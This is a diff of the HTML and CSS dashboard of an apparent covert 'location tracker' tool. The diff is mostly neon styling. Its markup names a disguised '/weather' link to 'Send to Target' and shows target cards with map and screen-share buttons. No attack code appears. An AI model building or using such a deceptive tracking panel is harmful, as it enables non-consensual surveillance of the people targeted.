@@ -1,47 +1,1627 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>⛧ LOCATION_TRACKER v3.0</title>
+
+    <!-- Google Fonts: Fira Code -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+
+    <style>
+        /* ============================================================
+               CSS VARIABLES – CYBERPUNK / HACKER THEME
+            ============================================================ */
+        :root {
+            --bg-primary: #0a0a10;
+            --bg-card: rgba(0, 255, 200, 0.04);
+            --bg-card-hover: rgba(0, 255, 200, 0.10);
+            --border-neon: #00ffcc;
+            --border-neon-dim: rgba(0, 255, 204, 0.15);
+            --border-magenta: #ff00ff;
+            --text-primary: #b0f0e6;
+            --text-secondary: #7ae0d0;
+            --text-muted: #4a8a82;
+            --glow-cyan: 0 0 20px rgba(0, 255, 204, 0.25);
+            --glow-cyan-strong: 0 0 40px rgba(0, 255, 204, 0.35);
+            --glow-magenta: 0 0 24px rgba(255, 0, 255, 0.2);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 16px;
+            --font: 'Fira Code', 'Courier New', monospace;
+            --transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            --perspective: 1000px;
+        }
+
+        /* ============================================================
+               GLOBAL RESET & BASE
+            ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            font-family: var(--font);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            cursor: default;
+        }
+
+        /* ============================================================
+               ANIMATED BACKGROUND – PARTICLES + GRID + ORBS
+            ============================================================ */
+
+        /* ---- Canvas for particles ---- */
+        #particleCanvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ---- Grid overlay ---- */
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background-image:
+                linear-gradient(rgba(0, 255, 204, 0.025) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 204, 0.025) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+            animation: gridMove 16s linear infinite;
+            opacity: 0.6;
+        }
+
+        @keyframes gridMove {
+            0% {
+                transform: translate(0, 0);
+            }
+            100% {
+                transform: translate(60px, 60px);
+            }
+        }
+
+        /* ---- Floating neon orbs ---- */
+        .bg-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(140px);
+            pointer-events: none;
+            z-index: 0;
+            animation: orbFloat 20s ease-in-out infinite alternate;
+            will-change: transform;
+        }
+        .bg-orb--1 {
+            width: 500px;
+            height: 500px;
+            top: -200px;
+            right: -150px;
+            background: #00ffcc;
+            opacity: 0.08;
+            animation-delay: 0s;
+        }
+        .bg-orb--2 {
+            width: 400px;
+            height: 400px;
+            bottom: -160px;
+            left: -120px;
+            background: #ff00ff;
+            opacity: 0.06;
+            animation-delay: -7s;
+        }
+        .bg-orb--3 {
+            width: 350px;
+            height: 350px;
+            top: 40%;
+            right: 10%;
+            background: #ffaa00;
+            opacity: 0.04;
+            animation-delay: -14s;
+        }
+        .bg-orb--4 {
+            width: 300px;
+            height: 300px;
+            bottom: 20%;
+            left: 30%;
+            background: #0077ff;
+            opacity: 0.05;
+            animation-delay: -5s;
+        }
+
+        @keyframes orbFloat {
+            0% {
+                transform: translate(0, 0) scale(1) rotate(0deg);
+            }
+            25% {
+                transform: translate(60px, -70px) scale(1.2) rotate(5deg);
+            }
+            50% {
+                transform: translate(-40px, 40px) scale(0.85) rotate(-3deg);
+            }
+            75% {
+                transform: translate(30px, -20px) scale(1.1) rotate(4deg);
+            }
+            100% {
+                transform: translate(-20px, 30px) scale(0.95) rotate(-2deg);
+            }
+        }
+
+        /* ---- Scanlines ---- */
+        .scanlines {
+            position: fixed;
+            inset: 0;
+            z-index: 1;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg,
+                    transparent 0px,
+                    transparent 3px,
+                    rgba(0, 255, 200, 0.005) 3px,
+                    rgba(0, 255, 200, 0.005) 4px);
+        }
+
+        /* ---- Vignette ---- */
+        .vignette {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse at center, transparent 50%, rgba(0, 0, 0, 0.5) 100%);
+        }
+
+        /* ============================================================
+               MAIN WRAPPER
+            ============================================================ */
+        .app-wrapper {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1.5rem;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 1100px;
+            margin: 0 auto;
+            perspective: var(--perspective);
+        }
+
+        /* ============================================================
+               HEADER – TERMINAL STYLE with animated border
+            ============================================================ */
+        .terminal-header {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(12px) saturate(1.2);
+            border: 1px solid var(--border-neon-dim);
+            border-radius: var(--radius-md);
+            padding: 1.5rem 2rem;
+            margin-bottom: 2.25rem;
+            box-shadow: var(--glow-cyan), 0 20px 40px -12px rgba(0, 0, 0, 0.9);
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition);
+            animation: headerPulse 4s ease-in-out infinite;
+        }
+
+        @keyframes headerPulse {
+            0%,
+            100% {
+                box-shadow: var(--glow-cyan), 0 20px 40px -12px rgba(0, 0, 0, 0.9);
+            }
+            50% {
+                box-shadow: var(--glow-cyan-strong), 0 20px 40px -12px rgba(0, 0, 0, 0.9);
+            }
+        }
+
+        .terminal-header::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: var(--radius-md);
+            padding: 2px;
+            background: conic-gradient(from 0deg, transparent, var(--border-neon), transparent, var(--border-magenta), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            animation: borderSpin 6s linear infinite;
+        }
+
+        @keyframes borderSpin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .terminal-header::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-md);
+            background: radial-gradient(circle at 30% 20%, rgba(0, 255, 204, 0.03), transparent 70%);
+            pointer-events: none;
+        }
+
+        /* terminal prompt line */
+        .term-line {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            margin-bottom: 0.25rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        .term-prompt {
+            color: var(--border-neon);
+            font-weight: 600;
+            font-size: 0.95rem;
+            letter-spacing: 0.02em;
+            text-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
+            animation: promptGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes promptGlow {
+            0%,
+            100% {
+                text-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
+            }
+            50% {
+                text-shadow: 0 0 20px rgba(0, 255, 204, 0.8), 0 0 40px rgba(0, 255, 204, 0.2);
+            }
+        }
+
+        .term-prompt .fa-chevron-right {
+            font-size: 0.8rem;
+            margin-right: 0.3rem;
+            animation: chevronPulse 1.2s ease-in-out infinite;
+        }
+
+        @keyframes chevronPulse {
+            0%,
+            100% {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            50% {
+                transform: translateX(4px);
+                opacity: 0.5;
+            }
+        }
+
+        .term-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            letter-spacing: 0.04em;
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.2);
+        }
+
+        .term-title .highlight {
+            color: #ff00ff;
+            text-shadow: 0 0 16px rgba(255, 0, 255, 0.4);
+            animation: magentaPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes magentaPulse {
+            0%,
+            100% {
+                text-shadow: 0 0 16px rgba(255, 0, 255, 0.4);
+            }
+            50% {
+                text-shadow: 0 0 32px rgba(255, 0, 255, 0.8), 0 0 60px rgba(255, 0, 255, 0.2);
+            }
+        }
+
+        .term-title .blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .header-creator {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            background: rgba(0, 255, 204, 0.04);
+            padding: 0.3rem 1rem 0.3rem 0.8rem;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 255, 204, 0.08);
+            transition: var(--transition);
+            margin-left: auto;
+            animation: creatorGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes creatorGlow {
+            0%,
+            100% {
+                border-color: rgba(0, 255, 204, 0.08);
+            }
+            50% {
+                border-color: rgba(0, 255, 204, 0.3);
+                box-shadow: 0 0 20px rgba(0, 255, 204, 0.05);
+            }
+        }
+
+        .header-creator:hover {
+            background: rgba(0, 255, 204, 0.08);
+            border-color: var(--border-neon);
+            box-shadow: var(--glow-cyan);
+        }
+
+        .header-creator a {
+            color: var(--text-primary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+
+        .header-creator a:hover {
+            color: var(--border-neon);
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.3);
+        }
+
+        .header-creator .fa-heart {
+            color: #ff00ff;
+            text-shadow: 0 0 12px rgba(255, 0, 255, 0.5);
+            animation: heartBeat 1.2s ease-in-out infinite;
+        }
+
+        @keyframes heartBeat {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            15% {
+                transform: scale(1.3);
+            }
+            30% {
+                transform: scale(1);
+            }
+            45% {
+                transform: scale(1.15);
+            }
+            60% {
+                transform: scale(1);
+            }
+        }
+
+        /* URL display */
+        .url-display {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: var(--radius-sm);
+            padding: 0.5rem 1rem 0.5rem 1.25rem;
+            border: 1px solid rgba(0, 255, 204, 0.06);
+            margin-top: 0.75rem;
+            transition: var(--transition);
+            position: relative;
+            z-index: 2;
+        }
+
+        .url-display:hover {
+            border-color: var(--border-neon);
+            box-shadow: var(--glow-cyan);
+        }
+
+        .url-display .label {
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--text-muted);
+            white-space: nowrap;
+        }
+
+        .url-display .label i {
+            margin-right: 4px;
+            color: var(--border-neon);
+            animation: iconPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes iconPulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        .url-display code {
+            font-family: var(--font);
+            font-size: 0.85rem;
+            color: #ff2a2a;
+            background: rgba(0, 255, 204, 0.04);
+            padding: 0.15rem 0.7rem;
+            border-radius: 4px;
+            word-break: break-all;
+            flex: 1;
+            min-width: 120px;
+            border-left: 2px solid var(--border-neon);
+            padding-left: 0.8rem;
+            transition: var(--transition);
+        }
+
+        .url-display:hover code {
+            border-left-color: var(--border-magenta);
+        }
+
+        .url-display .copy-btn {
+            background: rgba(0, 255, 204, 0.04);
+            border: 1px solid rgba(0, 255, 204, 0.1);
+            color: var(--text-secondary);
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            font-size: 0.85rem;
+            flex-shrink: 0;
+        }
+
+        .url-display .copy-btn:hover {
+            background: rgba(0, 255, 204, 0.12);
+            color: var(--border-neon);
+            box-shadow: var(--glow-cyan);
+            border-color: var(--border-neon);
+            transform: scale(1.1) rotate(5deg);
+        }
+
+        .url-display .copy-btn.copied {
+            background: rgba(0, 255, 204, 0.15);
+            color: var(--border-neon);
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
+            animation: copyFlash 0.5s ease-out;
+        }
+
+        @keyframes copyFlash {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.3);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* ============================================================
+               TARGETS SECTION – with animated gradient border
+            ============================================================ */
+        .targets-section {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(12px) saturate(1.1);
+            border: 1px solid rgba(0, 255, 204, 0.06);
+            border-radius: var(--radius-md);
+            padding: 1.75rem 2rem 2rem;
+            box-shadow: 0 20px 48px -12px rgba(0, 0, 0, 0.9);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            transition: var(--transition);
+        }
+
+        .targets-section::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: var(--radius-md);
+            padding: 2px;
+            background: conic-gradient(from 90deg, transparent, var(--border-neon), transparent, var(--border-magenta), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            animation: borderSpinReverse 8s linear infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes borderSpinReverse {
+            0% {
+                transform: rotate(360deg);
+            }
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        .targets-section::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-md);
+            background: radial-gradient(circle at 70% 80%, rgba(255, 0, 255, 0.02), transparent 60%);
+            pointer-events: none;
+        }
+
+        .targets-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        .targets-header .left {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .targets-header .left h2 {
+            font-size: 1rem;
+            font-weight: 500;
+            letter-spacing: 0.04em;
+            color: var(--text-secondary);
+            position: relative;
+        }
+
+        .targets-header .left h2 i {
+            color: var(--border-neon);
+            margin-right: 0.4rem;
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.3);
+            animation: iconPulse 2s ease-in-out infinite;
+        }
+
+        .badge-count {
+            background: rgba(0, 255, 204, 0.06);
+            color: var(--border-neon);
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 0.1rem 0.7rem;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 255, 204, 0.1);
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.1);
+            transition: var(--transition);
+        }
+
+        .badge-count:hover {
+            border-color: var(--border-neon);
+            box-shadow: var(--glow-cyan);
+        }
+
+        .badge-count .num {
+            color: var(--text-primary);
+            font-weight: 700;
+            transition: var(--transition);
+        }
+
+        .badge-count .num.pop {
+            animation: numberPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes numberPop {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.6);
+                color: var(--border-neon);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .status-pulse {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            letter-spacing: 0.06em;
+        }
+
+        .status-pulse .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--border-neon);
+            animation: pulseDot 1.8s ease-in-out infinite;
+            box-shadow: 0 0 12px rgba(0, 255, 204, 0.5);
+            display: inline-block;
+        }
+
+        @keyframes pulseDot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+                box-shadow: 0 0 12px rgba(0, 255, 204, 0.5);
+            }
+            50% {
+                opacity: 0.2;
+                transform: scale(0.6);
+                box-shadow: 0 0 4px rgba(0, 255, 204, 0.1);
+            }
+        }
+
+        .status-pulse .dot.warning {
+            background: #ffaa00;
+            box-shadow: 0 0 12px rgba(255, 170, 0, 0.4);
+        }
+
+        /* ============================================================
+               TARGET GRID – 3D CARDS with animated glow
+            ============================================================ */
+        .target-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 1.2rem;
+            transform-style: preserve-3d;
+            position: relative;
+            z-index: 2;
+        }
+
+        .target-card {
+            display: flex;
+            align-items: center;
+            gap: 0.9rem;
+            background: var(--bg-card);
+            border: 1px solid rgba(0, 255, 204, 0.08);
+            border-radius: var(--radius-sm);
+            padding: 0.9rem 1.2rem 0.9rem 1rem;
+            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            transform: rotateX(0deg) rotateY(0deg) translateZ(0);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+            animation: cardIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both;
+        }
+
+        /* Animated shimmer on card */
+        .target-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-sm);
+            background: linear-gradient(105deg,
+                    transparent 30%,
+                    rgba(0, 255, 204, 0.03) 45%,
+                    rgba(255, 0, 255, 0.02) 55%,
+                    transparent 70%);
+            background-size: 200% 100%;
+            animation: shimmer 4s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -200% 0;
+            }
+            100% {
+                background-position: 200% 0;
+            }
+        }
+
+        .target-card:hover {
+            background: var(--bg-card-hover);
+            border-color: var(--border-neon);
+            box-shadow: var(--glow-cyan), 0 12px 32px -8px rgba(0, 0, 0, 0.8);
+            transform: translateY(-4px) rotateX(2deg) rotateY(4deg) scale(1.02);
+        }
+
+        .target-card::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-sm);
+            padding: 1px;
+            background: linear-gradient(135deg, rgba(0, 255, 204, 0.2), rgba(255, 0, 255, 0.1));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            opacity: 0;
+            transition: var(--transition);
+        }
+
+        .target-card:hover::after {
+            opacity: 1;
+        }
+
+        .target-card:active {
+            transform: scale(0.95) rotateX(0deg) rotateY(0deg);
+        }
+
+        .target-card .card-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: var(--radius-sm);
+            background: rgba(0, 255, 204, 0.06);
+            border: 1px solid rgba(0, 255, 204, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            color: var(--border-neon);
+            flex-shrink: 0;
+            transition: var(--transition);
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.2);
+        }
+
+        .target-card:hover .card-icon {
+            background: rgba(0, 255, 204, 0.12);
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
+            transform: scale(1.05) rotate(-5deg);
+        }
+
+        .target-card .card-body {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .target-card .card-body .name {
+            font-weight: 600;
+            font-size: 0.9rem;
+            letter-spacing: 0.01em;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-shadow: 0 0 8px rgba(0, 255, 204, 0.05);
+            transition: var(--transition);
+        }
+
+        .target-card:hover .card-body .name {
+            text-shadow: 0 0 12px rgba(0, 255, 204, 0.15);
+        }
+
+        .target-card .card-body .sub {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            letter-spacing: 0.04em;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            margin-top: 0.15rem;
+            text-transform: uppercase;
+        }
+
+        .target-card .card-body .sub .status-dot {
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: var(--border-neon);
+            display: inline-block;
+            animation: pulseDot 2s ease-in-out infinite;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.4);
+        }
+
+        /* ----- Card Actions (Screen Share + Map) ----- */
+        .card-actions {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            flex-shrink: 0;
+        }
+
+        .card-actions .screen-btn {
+            background: rgba(255, 0, 255, 0.06);
+            border: 1px solid rgba(255, 0, 255, 0.1);
+            color: #ff00ff;
+            width: 30px;
+            height: 30px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            font-size: 0.8rem;
+            text-decoration: none;
+        }
+
+        .card-actions .screen-btn:hover {
+            background: rgba(255, 0, 255, 0.15);
+            border-color: #ff00ff;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.15);
+            transform: scale(1.1);
+        }
+
+        .card-actions .arrow-link {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            transition: var(--transition);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            padding: 2px 4px;
+        }
+
+        .card-actions .arrow-link:hover {
+            color: var(--border-neon);
+            transform: translateX(4px);
+        }
+
+        .target-card.card-new {
+            animation: cardNew 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+        }
+
+        @keyframes cardNew {
+            0% {
+                opacity: 0;
+                transform: scale(0.8) rotateX(10deg) translateY(-30px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) rotateX(0) translateY(0);
+            }
+        }
+
+        .target-card:nth-child(1) { animation-delay: 0.05s; }
+        .target-card:nth-child(2) { animation-delay: 0.1s; }
+        .target-card:nth-child(3) { animation-delay: 0.15s; }
+        .target-card:nth-child(4) { animation-delay: 0.2s; }
+        .target-card:nth-child(5) { animation-delay: 0.25s; }
+        .target-card:nth-child(6) { animation-delay: 0.3s; }
+        .target-card:nth-child(7) { animation-delay: 0.35s; }
+        .target-card:nth-child(8) { animation-delay: 0.4s; }
+        .target-card:nth-child(9) { animation-delay: 0.45s; }
+        .target-card:nth-child(10) { animation-delay: 0.5s; }
+
+        @keyframes cardIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) rotateX(8deg) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) rotateX(0) scale(1);
+            }
+        }
+
+        /* ============================================================
+               EMPTY STATE
+            ============================================================ */
+        .empty-state {
+            text-align: center;
+            padding: 3rem 1rem;
+            color: var(--text-secondary);
+        }
+        .empty-state .icon-big {
+            font-size: 2.5rem;
+            color: var(--text-muted);
+            margin-bottom: 0.75rem;
+            opacity: 0.4;
+            animation: floatIcon 3s ease-in-out infinite;
+        }
+
+        @keyframes floatIcon {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-8px);
+            }
+        }
+
+        .empty-state p {
+            font-size: 0.9rem;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+        .empty-state .hint {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-top: 0.5rem;
+        }
+
+        /* ============================================================
+               TOAST – CYBER STYLE
+            ============================================================ */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-neon);
+            color: var(--text-primary);
+            padding: 0.6rem 1.8rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            box-shadow: var(--glow-cyan), 0 16px 48px rgba(0, 0, 0, 0.7);
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            pointer-events: none;
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-family: var(--font);
+            letter-spacing: 0.04em;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .toast .fa-check-circle {
+            color: var(--border-neon);
+            text-shadow: 0 0 20px rgba(0, 255, 204, 0.4);
+            animation: toastIcon 1s ease-in-out infinite;
+        }
+
+        @keyframes toastIcon {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
+        /* ============================================================
+               GLITCH TEXT
+            ============================================================ */
+        .glitch-text {
+            position: relative;
+            display: inline-block;
+        }
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.6;
+        }
+        .glitch-text::before {
+            color: #ff00ff;
+            z-index: -1;
+            animation: glitch1 2.5s infinite;
+        }
+        .glitch-text::after {
+            color: #00ffcc;
+            z-index: -2;
+            animation: glitch2 2.5s infinite;
+        }
+        @keyframes glitch1 {
+            0%,
+            100% {
+                transform: translate(0);
+            }
+            20% {
+                transform: translate(-2px, 2px);
+            }
+            40% {
+                transform: translate(2px, -2px);
+            }
+            60% {
+                transform: translate(-1px, -1px);
+            }
+            80% {
+                transform: translate(1px, 2px);
+            }
+        }
+        @keyframes glitch2 {
+            0%,
+            100% {
+                transform: translate(0);
+            }
+            20% {
+                transform: translate(2px, -2px);
+            }
+            40% {
+                transform: translate(-2px, 2px);
+            }
+            60% {
+                transform: translate(1px, 1px);
+            }
+            80% {
+                transform: translate(-1px, -2px);
+            }
+        }
+
+        /* ============================================================
+               RESPONSIVE
+            ============================================================ */
+        @media (max-width: 768px) {
+            .app-wrapper {
+                padding: 1rem 0.75rem;
+            }
+            .terminal-header {
+                padding: 1.25rem 1.25rem;
+            }
+            .term-title {
+                font-size: 1rem;
+            }
+            .term-line {
+                flex-wrap: wrap;
+            }
+            .header-creator {
+                margin-left: 0;
+                font-size: 0.7rem;
+                padding: 0.2rem 0.7rem;
+            }
+            .url-display {
+                flex-wrap: wrap;
+                padding: 0.5rem 0.8rem;
+            }
+            .url-display code {
+                font-size: 0.7rem;
+                min-width: 80px;
+            }
+            .targets-section {
+                padding: 1.25rem 1rem 1.5rem;
+            }
+            .target-grid {
+                grid-template-columns: 1fr;
+                gap: 0.7rem;
+            }
+            .target-card {
+                padding: 0.75rem 1rem;
+            }
+            .targets-header .left h2 {
+                font-size: 0.9rem;
+            }
+            .status-pulse {
+                font-size: 0.6rem;
+            }
+            .bg-orb--1 {
+                width: 300px;
+                height: 300px;
+            }
+            .bg-orb--2 {
+                width: 250px;
+                height: 250px;
+            }
+            .bg-orb--3 {
+                width: 200px;
+                height: 200px;
+            }
+            .bg-orb--4 {
+                width: 180px;
+                height: 180px;
+            }
+            .card-actions .screen-btn {
+                width: 28px;
+                height: 28px;
+                font-size: 0.7rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .terminal-header {
+                padding: 0.9rem 0.9rem;
+            }
+            .term-title {
+                font-size: 0.85rem;
+            }
+            .term-prompt {
+                font-size: 0.8rem;
+            }
+            .url-display code {
+                font-size: 0.6rem;
+            }
+            .target-card .card-body .name {
+                font-size: 0.8rem;
+            }
+            .target-grid {
+                grid-template-columns: 1fr;
+            }
+            .card-actions .screen-btn {
+                width: 26px;
+                height: 26px;
+                font-size: 0.65rem;
+            }
+            .card-actions .arrow-link {
+                font-size: 0.7rem;
+            }
+        }
+
+        /* ============================================================
+               REDUCED MOTION
+            ============================================================ */
+        @media (prefers-reduced-motion: reduce) {
+            .bg-grid { animation: none; }
+            .bg-orb { animation: none; }
+            .terminal-header { animation: none; }
+            .terminal-header::before { animation: none; }
+            .targets-section::before { animation: none; }
+            .target-card::before { animation: none; }
+            .glitch-text::before,
+            .glitch-text::after { animation: none; }
+            .target-card { animation: none; opacity: 1 !important; transform: none !important; }
+            .target-card.card-new { animation: none; }
+            .badge-count .num.pop { animation: none; }
+            .header-creator .fa-heart { animation: none; }
+            .term-prompt { animation: none; }
+            .term-prompt .fa-chevron-right { animation: none; }
+            .term-title .highlight { animation: none; }
+            .status-pulse .dot { animation: none; }
+            .target-card .card-body .sub .status-dot { animation: none; }
+            .toast .fa-check-circle { animation: none; }
+            .empty-state .icon-big { animation: none; }
+            .header-creator { animation: none; }
+            .url-display .label i { animation: none; }
+            .targets-header .left h2 i { animation: none; }
+            .card-actions .screen-btn:hover { transform: none; }
+            .target-card:hover { transform: none !important; }
+        }
+    </style>
 </head>
-
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="http://madhanmaaz.netlify.app/" class="is-block mb-2">Created by madhanmaaz</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
-    </header>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
+    <!-- ===== ANIMATED BACKGROUND ===== -->
+    <canvas id="particleCanvas"></canvas>
+    <div class="bg-grid"></div>
+    <div class="bg-orb bg-orb--1"></div>
+    <div class="bg-orb bg-orb--2"></div>
+    <div class="bg-orb bg-orb--3"></div>
+    <div class="bg-orb bg-orb--4"></div>
+    <div class="scanlines"></div>
+    <div class="vignette"></div>
 
-        {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
-            {{ key }}
-        </a>
